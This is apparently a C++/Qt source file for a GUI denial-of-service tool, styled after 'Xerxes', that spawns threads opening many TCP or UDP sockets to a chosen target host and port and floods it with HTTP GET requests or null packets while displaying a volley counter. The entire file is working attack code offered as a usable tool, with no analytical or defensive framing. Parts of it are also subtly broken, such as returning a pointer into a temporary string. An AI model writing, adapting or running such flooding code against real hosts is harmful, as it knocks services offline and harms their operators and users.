#include <QMessageBox>
#include <QString>

#include "attack.h"
#include "ui_attack.h"

Attack::Attack(QWidget *parent) :
    QDialog(parent),
    ui(new Ui::Attack)
{
    ui->setupUi(this);
}

Attack::~Attack()
{
    delete ui;
}

QAbstractSocket *Attack::make_socket(QString& host, QString& port) {
    if(!running){
        return nullptr;
    }
    QAbstractSocket *sock;
    switch (protocol) {
    case TCP:{
        sock = new QTcpSocket();
        sock->connectToHost(host, port.toInt(), QTcpSocket::WriteOnly);
        break;
    }
    case UDP:{
        sock = new QUdpSocket();
        sock->connectToHost(host, port.toInt(), QUdpSocket::WriteOnly);
        break;
    }

    default:
        break;
    }
    if(sock->isValid()){
        return sock;
    }else{
        return nullptr;
    }
}

int Attack::write_socket(QAbstractSocket *sock){
    QString packet = make_packet();
    return sock->write(packet.toUtf8());
}

const char *Attack::make_packet(){
    QString packet{};
    switch(vector){
    case HTTP:
        packet = "GET / HTTP/1.0\r\nUser-Agent: Wget/1.16 (Xerxes The Great)\r\nAccept: */*\r\nConnection: Keep-Alive\r\n\r\n";
        break;
    default:
        packet = QString::fromLocal8Bit("\0");
    }
    return packet.toStdString().c_str();
}

void Attack::dos() {
    QAbstractSocket *sockets[connections];
    int x;
    for(x=0; x < connections; x++){
        sockets[x] = nullptr;
    }

    while(running) {
        for(x=0; running && x < connections; x++) {
            if(sockets[x] == nullptr){
                sockets[x] = make_socket(target, port);
                continue;
            }
            if((write_socket(sockets[x])) == -1){
                sockets[x]->disconnect();
                sockets[x]->close();
                sockets[x] = make_socket(target, port);
            }
            voly++;
        }
        voly++;
        QThread::usleep(20);
    }
    for(int i = 0; i < connections; i++){
        if(sockets[i] != nullptr){
            sockets[i]->disconnect();
            sockets[i]->close();
            delete sockets[i];
        }
    }
}


void Attack::start(){
    for(int x = 0; running && x != threads; x++) {
        auto trd = QtConcurrent::run([&]{dos();});
        thread_list.append(trd);
    }
}

void Attack::stop(){
    running = false;
    for(auto thread : thread_list){
        thread.cancel();
        thread.waitForFinished();
    }
    accept();
}

void Attack::on_pushButton_clicked()
{
    stop();
}

void Attack::set_config(QString t, QString p, int trds, int con, Vector vec){
    target = t;
    port = p;
    threads = trds;
    connections = con;
    ui->label_6->setText(target);
    ui->label_7->setText(port);
    ui->label_8->setText(QString::number(threads));
    ui->label_9->setText(QString::number(connections));
    ui->label_10->setText(QString::number(voly));
    switch (vec) {
    case HTTP:
        ui->label_13->setText("HTTP");
        protocol = TCP;
        break;
    case NullTCP:
        ui->label_13->setText("NULLTCP");
        protocol = TCP;
        break;
    case NullUDP:
        ui->label_13->setText("NULLUDP");
        protocol = UDP;
        break;
    default:break;
    }
}

void Attack::update_gui(){
    while(running){
        QThread::usleep(20000);
        ui->label_10->setText(QString::number(voly));
    }
}

void Attack::showEvent(QShowEvent *event){
    QWidget::showEvent(event);
    QtConcurrent::run([&]{start();});
    QtConcurrent::run([&]{update_gui();});
    return;
}
